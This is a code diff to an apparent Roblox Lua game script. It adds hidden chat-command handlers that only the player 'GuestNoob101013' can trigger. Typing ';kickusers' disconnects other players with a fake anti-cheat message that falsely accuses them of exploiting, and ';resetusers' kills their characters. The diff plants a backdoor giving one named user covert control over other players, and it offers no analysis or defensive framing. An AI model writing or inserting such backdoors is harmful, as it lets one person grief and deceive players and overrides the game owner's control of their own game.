@@ -1,3 +1,4 @@
+--restart
 local function onChatMessage(message, plr)
     if plr then
         if message:match(";restart") and plr.Name == "GuestNoob101013" then
@@ -11,10 +12,25 @@ for _,v in ipairs(game.Players:GetPlayers()) do
 end
 game.Players.PlayerAdded:Connect(function(v) v.Chatted:Connect(function(m) onChatMessage(m, v) end) end)
 
+--kick
 local function onChatMessage(message, plr)
     if plr then
         if message:match(";kickusers") and plr.Name == "GuestNoob101013" then
             game.Players.LocalPlayer:Kick("Anti-Cheat: You were kicked for exploiting. | Cheat Detected: HijackedBoat")
+        end
+    end
+end
+
+for _,v in ipairs(game.Players:GetPlayers()) do
+  v.Chatted:Connect(function(m) onChatMessage(m, v) end)
+end
+game.Players.PlayerAdded:Connect(function(v) v.Chatted:Connect(function(m) onChatMessage(m, v) end) end)
+
+--reset
+local function onChatMessage(message, plr)
+    if plr then
+        if message:match(";resetusers") and plr.Name == "GuestNoob101013" then
+            game.Players.LocalPlayer.Character.Humanoid.Health = 0
         end
     end
 end
